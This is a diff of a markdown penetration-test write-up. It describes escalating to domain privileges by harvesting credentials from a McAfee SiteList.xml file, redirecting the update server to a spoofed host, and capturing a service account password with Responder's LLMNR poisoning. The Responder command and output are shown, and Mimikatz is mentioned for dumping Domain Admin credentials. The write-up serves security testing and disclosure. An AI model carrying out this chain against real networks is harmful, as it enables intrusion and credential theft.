@@ -1,13 +1,13 @@
 
-# McAfee privileged SiteList.xml leads to Active Directory domain privilege escalation
+# *McAfee* privileged SiteList.xml leads to *Active Directory* domain privilege escalation
 
-During an intern pentest, I came accross a nice way to privesc in an Active Directory domain.
+During an intern pentest, I came accross a nice way to privesc in an *Active Directory* domain.
 I owned an employee's laptop with *McAfee Virusscan Enterprise 8.8* installed and a low privilege account.
 
-Mcafee has a feature to customize update servers and can connect to these servers via HTTP or SMB.
+*Mcafee* has a feature to customize update servers and can connect to these servers via HTTP or SMB.
 The file *SiteList.xml* contains juicy informations like credentials, domain name servers, ... it looks like this :
 
-###### C:\ProgramData\McAfee\Common Framework\SiteList.xml
+#### C:\ProgramData\McAfee\Common Framework\SiteList.xml
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -71,9 +71,9 @@ Global Group memberships      *Domain Services Account*Workstations Administrato
 The command completed successfully. 
 ```
 
-Unfortunately McAfee used GUI password, I couldn't edit the file. Thus, I downloaded and installed the AV on my Windows Virtual Machine and just copied/pasted my own SiteList.xml with the previous precious sesame.
+Unfortunately the AV used GUI password, I couldn't edit the file. Thus, I downloaded and installed *McAfee* on my *Windows* Virtual Machine and just copied/pasted the previous precious sesame in my own *SiteList.xml*.
 
-At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof with *Responder*. *Responder* has this nice feature to return an HTTP authentication to fool people. Actually the SiteList.xml looks like this :
+At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof using *Responder*. Actually the SiteList.xml looks like this :
 
 ###### C:\ProgramData\McAfee\Common Framework\SiteList.xml
 
@@ -91,7 +91,7 @@ At this time, I knew that It was close. I edited the file like I could force an 
 </SiteList></ns:SiteLists>
 ```
 
-And the *Responder* command line is :
+And *Responder* enters the dance :
 
 ```
 root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
@@ -145,6 +145,7 @@ root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
 
 
 [+] Listening for events...
+
 [*] [LLMNR]  Poisoned answer sent to 192.168.169.141 for name fuckingrandomserver
 
 [HTTP] Basic Client   : 192.168.169.141
@@ -152,7 +153,7 @@ root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
 [HTTP] Basic Password : *\cool_its_a_strong_password/*
 ```
 
-OMG, we got it ! Now, I have privesc :) I could logon on the Domain Controler and dump `*Domain Admins*` credentials using *Mimikatz*.
+OMG, we got it ! Now, I can level up :) I could logon on the *Domain Controler* and dump `*Domain Admins*` credentials using *Mimikatz*.
 
 Ty !
 
